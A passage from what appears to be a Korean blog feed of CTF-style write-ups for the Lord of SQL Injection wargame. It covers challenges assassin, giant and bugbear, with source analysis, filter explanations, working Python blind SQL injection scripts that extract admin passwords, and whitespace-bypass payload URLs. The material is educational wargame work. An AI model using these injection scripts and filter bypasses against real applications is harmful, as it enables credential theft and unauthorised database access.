urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> ascii_lowercase</span><br><span class="line"></span><br><span class="line">guestpwlen = <span class="number">0</span></span><br><span class="line">adminpwlen = <span class="number">0</span></span><br><span class="line">key = <span class="string">""</span> <span class="comment"># admin 비밀번호가 저장될 문자열</span></span><br><span class="line">guestkey = <span class="string">""</span> <span class="comment"># guest 비밀번호가 저장될 문자열</span></span><br><span class="line">findadmin = <span class="literal">False</span> <span class="comment"># guest 비밀번호 문자와 admin 비밀번호 문자가 같은 경우 처리하기 위해 만든 변수</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="</span></span><br><span class="line">    data = (<span class="string">'_'</span> * i) <span class="comment"># 한 문자 와일드카드인 _ 이용하여 pw 길이 측정</span></span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    result = req.readline()</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(result).find(<span class="string">"Hello guest"</span>) != <span class="number">-1</span>:</span><br><span class="line">        guestpwlen = i</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"guest pw length : "</span> + str(guestpwlen))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(result).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        adminpwlen = i</span><br><span class="line">        <span class="keyword">print</span> (<span class="string">"admin pw length : "</span> + str(adminpwlen))</span><br><span class="line">        findadmin = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> findadmin:</span><br><span class="line">    adminpwlen = guestpwlen</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"admin pw length : "</span> + str(adminpwlen))</span><br><span class="line">findadmin = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, adminpwlen):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> findadmin:</span><br><span class="line">        key = guestkey</span><br><span class="line">    findadmin = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> digits + ascii_lowercase:</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="</span></span><br><span class="line">        data = key + <span class="string">"&#123;&#125;"</span>.format(j) + (<span class="string">"_"</span> * (<span class="number">7</span> - i))</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(<span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Accept"</span>, <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"</span>)</span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        result = req.readline()</span><br><span class="line">        print(result)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(result).find(<span class="string">"Hello guest"</span>) != <span class="number">-1</span>: <span class="comment"># guest와 admin이 같은 비밀번호를 가질 경우 Hello guest가 출력되므로 일단 guestkey에 저장했다가 findadmin을 이용하여 처리</span></span><br><span class="line">            guestkey += j</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"g : "</span> + guestkey)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(result).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += j</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">"a : "</span> + key)</span><br><span class="line">            findadmin = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">print</span> (key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>832edd10</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw=832edd10</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 15번 assassin 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.14 Giant</title>
    <link href="https://www.jslee.me/2019/08/25/los-write-up-14-giant/"/>
    <id>https://www.jslee.me/2019/08/25/los-write-up-14-giant/</id>
    <published>2019-08-25T14:19:56.000Z</published>
    <updated>2019-09-17T06:08:17.183Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 14번 giant 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>\n</code>, <code>\r</code>, <code>\t</code>, <code>(공백)</code> 을 포함하지 않고 SQL Injection을 하여 공백 효과를 낼 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="공백-n-r-t을-제외한-한-문자-공백문자-대체"><a href="#공백-n-r-t을-제외한-한-문자-공백문자-대체" class="headerlink" title="(공백), \n, \r, \t을 제외한 한 문자 공백문자 대체"></a><code>(공백)</code>, <code>\n</code>, <code>\r</code>, <code>\t</code>을 제외한 한 문자 공백문자 대체</h4><ol><li>VT(Vertical Tab)<br>ASCII Code 표를 살펴보면 16진수로 <code>0x0B</code>는 Vertical Tab에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</li><li>FF(Form Feed)<br>ASCII Code 표를 살펴보면 16진수로 <code>0x0C</code>는 Form Feed에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</li></ol><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>giant 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/ |\n|\r|\t/i'</span>, $_GET[shit])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select 1234 from&#123;$_GET[shit]&#125;prob_giant where 1"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="number">1234</span>]) solve(<span class="string">"giant"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($_GET[shit])&gt;<span class="number">1</span>) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/ |\n|\r|\t/i'</span>, $_GET[shit])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>shit</code>를 받고, <code>shit</code>의 길이가 <code>1</code> 초과이면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <code>shit</code>에 <code>(공백)</code>, <code>\n</code>, <code>\r</code>, <code>\t</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select 1234 from&#123;$_GET[shit]&#125;prob_giant where 1"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="number">1234</span>]) solve(<span class="string">"giant"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>shit</code>이 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li>문제 풀이가 성공하는 조건은 ‘<code>$result[1234]</code>에 참이 되는 어떤 값이든 들어 있음’이다. 즉, <code>$_GET[shit]</code>에 공백 역할을 하는 문자를 삽입하면 풀린다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p>Vertical Tab 이용</p><p><code>%0B</code>(Vertical Tab)을 GET 방식으로 <code>shit</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0B</span><br></pre></td></tr></table></figure></li><li><p>Form Feed 이용</p><p><code>%0C</code>(Form Feed)을 GET 방식으로 <code>shit</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/giant_9e5c61fc7f0711c680a4bf2553ee60bb.php?shit=%0C</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 14번 giant 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.13 Bugbear</title>
    <link href="https://www.jslee.me/2019/08/24/los-write-up-13-bugbear/"/>
    <id>https://www.jslee.me/2019/08/24/los-write-up-13-bugbear/</id>
    <published>2019-08-23T16:53:32.000Z</published>
    <updated>2019-09-17T06:08:17.182Z</updated>
    
    <content type="html"><![CDATA[<h2 id="개요"><a href="#개요" class="headerlink" title="개요"></a>개요</h2><img src="/image/los-main.png" width="300"><p>SQL Injection에 대한 지식을 쌓기 위해 <a href="https://los.eagle-jump.org/" target="_blank" rel="noopener">Lord of SQL Injection 사이트</a>의 문제를 풀고 해답을 정리한다.</p><p>이 문서에서는 Lord of SQL Injection 13번 bugbear 문제에 대하여 정리한다.</p><a id="more"></a><h2 id="문제-분석"><a href="#문제-분석" class="headerlink" title="문제 분석"></a>문제 분석</h2><h3 id="문제-출제-의도"><a href="#문제-출제-의도" class="headerlink" title="문제 출제 의도"></a>문제 출제 의도</h3><p><code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>을 대소문자 구분 없이 포함하지 않고 Blind SQL Injection을 하여 <code>pw</code>를 알아낼 수 있는지 확인한다.</p><h3 id="필요-배경-지식"><a href="#필요-배경-지식" class="headerlink" title="필요 배경 지식"></a>필요 배경 지식</h3><h4 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes"></a>addslashes</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string addslashes ( string $str )</span><br></pre></td></tr></table></figure><ul><li><code>addslashes</code> 함수는 데이터베이스 질의 등에서 처리할 필요가 있는 문자(홑따옴표(‘), 겹따옴표(“), 백슬래시(\), NUL(NULL 바이트)) 앞에 백슬래시를 붙인 문자열을 반환한다.</li><li>php의 <code>addslashes</code> 함수에 대해 잘 모르겠다면 다음 링크를 참고하자.</li><li><a href="http://php.net/manual/kr/function.addslashes.php" target="_blank" rel="noopener">PHP: addslashes - Manual</a></li></ul><h4 id="공백문자-대체"><a href="#공백문자-대체" class="headerlink" title="공백문자 대체"></a>공백문자 대체</h4><ol><li>CR(Carriage Return) 이용<br>ASCII Code 표를 살펴보면 16진수로 <code>0x0D</code>는 Carriage Return에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</li><li>LF(Line Feed)<br>ASCII Code 표를 살펴보면 16진수로 <code>0x0A</code>는 Line Feed에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</li><li>Tab<br>ASCII Code 표를 살펴보면 16진수로 <code>0x09</code>는 Tab에 해당한다.<br>이는 MySQL에서 공백으로 인식하는 문자들 중 하나이다.</li><li>주석<br>MySQL에서 구문 사이에 주석을 넣으면 공백이 없어도 정상적으로 동작한다.</li></ol><h3 id="소스-코드-분석"><a href="#소스-코드-분석" class="headerlink" title="소스 코드 분석"></a>소스 코드 분석</h3><p>bugbear 문제의 php 소스 코드는 다음과 같다.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">include</span> <span class="string">"./config.php"</span>;</span><br><span class="line">  login_chk();</span><br><span class="line">  dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=|or|and| |like|0x/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_bugbear where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">  $_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">  $query = <span class="string">"select pw from prob_bugbear where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  $result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line">  <span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"bugbear"</span>);</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\'|substr|ascii|=|or|and| |like|0x/i'</span>, $_GET[no])) <span class="keyword">exit</span>(<span class="string">"HeHe"</span>);</span><br></pre></td></tr></table></figure><ul><li>GET 방식으로 <code>pw</code>를 받고, <code>pw</code>에 <code>prob</code>, <code>_</code>, <code>.</code>, <code>()</code> 가 들어 있으면 <code>No Hack ~_~</code>이 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>pw</code>에 <code>&#39;</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li><li>또한, <strong>대소문자 구분 없이</strong> <code>no</code>에 <code>&#39;</code>, <code>substr</code>, <code>ascii</code>, <code>=</code>, <code>or</code>, <code>and</code>, <code>(공백)</code>, <code>like</code>, <code>0x</code> 가 들어 있으면 <code>HeHe</code>가 뜨고 문제 풀이에 실패한다.</li></ul><h4 id="Query"><a href="#Query" class="headerlink" title="Query"></a>Query</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$query = <span class="string">"select id from prob_bugbear where id='guest' and pw='&#123;$_GET[pw]&#125;' and no=&#123;$_GET[no]&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">'id'</span>]) <span class="keyword">echo</span> <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$_GET[pw] = addslashes($_GET[pw]);</span><br><span class="line">$query = <span class="string">"select pw from prob_bugbear where id='admin' and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">$result = @mysql_fetch_array(mysql_query($query));</span><br><span class="line"><span class="keyword">if</span>(($result[<span class="string">'pw'</span>]) &amp;&amp; ($result[<span class="string">'pw'</span>] == $_GET[<span class="string">'pw'</span>])) solve(<span class="string">"bugbear"</span>);</span><br></pre></td></tr></table></figure><ul><li>받은 <code>pw</code>와 <code>no</code>가 직접 쿼리에 들어간다. 이것으로 SQL Injection 공격이 가능하다는 것을 알 수 있다.</li><li><code>$result[&#39;id&#39;]</code>에 참이 되는 어떤 값이든 들어 있으면 응답에 <code>&quot;Hello &quot;</code>와 <code>$result[id]</code> 값을 붙인 문자열이 포함된다.</li><li>문제 풀이가 성공하는 조건은 ‘데이터베이스에서 받은 <code>pw</code>와 GET 방식으로 전달받은 <code>pw</code>가 같음’이다. 즉, 실제 데이터베이스에 저장된 <code>pw</code>를 알아내서 전달해야 한다.</li></ul><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><ol><li><p><code>MID</code> 함수, <code>REGEXP</code> 활용</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">key = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">pwlen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    url = <span class="string">"http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="</span></span><br><span class="line">    data = <span class="string">'-1/**/||/**/length(pw)/**/regexp/**/"^&#123;&#125;$"#'</span>.format(str(i)) <span class="comment"># = 을 못쓰므로 LIKE 로 수정</span></span><br><span class="line">    print(data)</span><br><span class="line">    data = quote(data)</span><br><span class="line">    re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">    re.add_header(</span><br><span class="line">        <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">        pwlen = i</span><br><span class="line">        print(<span class="string">'pw length : '</span> + str(pwlen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, pwlen + <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        url = <span class="string">"http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?no="</span></span><br><span class="line">        data = <span class="string">'-1/**/||/**/mid(pw,1,&#123;&#125;)/**/regexp/**/"^&#123;&#125;$"#'</span>.format(</span><br><span class="line">            str(i), key + chr(j))</span><br><span class="line">        print(data)</span><br><span class="line">        data = quote(data)</span><br><span class="line">        re = urllib.request.Request(url + data)</span><br><span class="line"></span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"User-agent"</span>, <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"</span>)</span><br><span class="line">        re.add_header(</span><br><span class="line">            <span class="string">"Cookie"</span>, <span class="string">"PHPSESSID=bb9ultdedrmse87p4473hmms81"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        req = urllib.request.urlopen(re)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> str(req.read()).find(<span class="string">"Hello admin"</span>) != <span class="number">-1</span>:</span><br><span class="line">            key += chr(j).lower()</span><br><span class="line">            print(key)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(key)</span><br></pre></td></tr></table></figure><p>이러한 코드를 실행하면 결과값으로 <code>735c2773</code> 를 출력한다.<br>이를 GET 방식으로 <code>pw</code>의 값으로 전달하면 풀린다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php?pw=735c2773</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;개요&quot;&gt;&lt;a href=&quot;#개요&quot; class=&quot;headerlink&quot; title=&quot;개요&quot;&gt;&lt;/a&gt;개요&lt;/h2&gt;&lt;img src=&quot;/image/los-main.png&quot; width=&quot;300&quot;&gt;

&lt;p&gt;SQL Injection에 대한 지식을 쌓기 위해 &lt;a href=&quot;https://los.eagle-jump.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lord of SQL Injection 사이트&lt;/a&gt;의 문제를 풀고 해답을 정리한다.&lt;/p&gt;
&lt;p&gt;이 문서에서는 Lord of SQL Injection 13번 bugbear 문제에 대하여 정리한다.&lt;/p&gt;
    
    </summary>
    
      <category term="Write Up" scheme="https://www.jslee.me/categories/Write-Up/"/>
    
    
      <category term="Lord of SQL Injection" scheme="https://www.jslee.me/tags/Lord-of-SQL-Injection/"/>
    
      <category term="Infosec" scheme="https://www.jslee.me/tags/Infosec/"/>
    
  </entry>
  
  <entry>
    <title>Lord of SQL Injection Write Up No.12 Darkknight</title>
    <link href="https://www.jslee.me/2019/08/23/los-write-up-12-darkknight/"/>
    <id>https://www.jslee.me/2019/08/23/los-write-up-12-darkknight/</id>
    <published>2019-08-23T01:28:26.000Z</published>
    <updated>2019-08-26T10:38:12.364Z</updated>
    
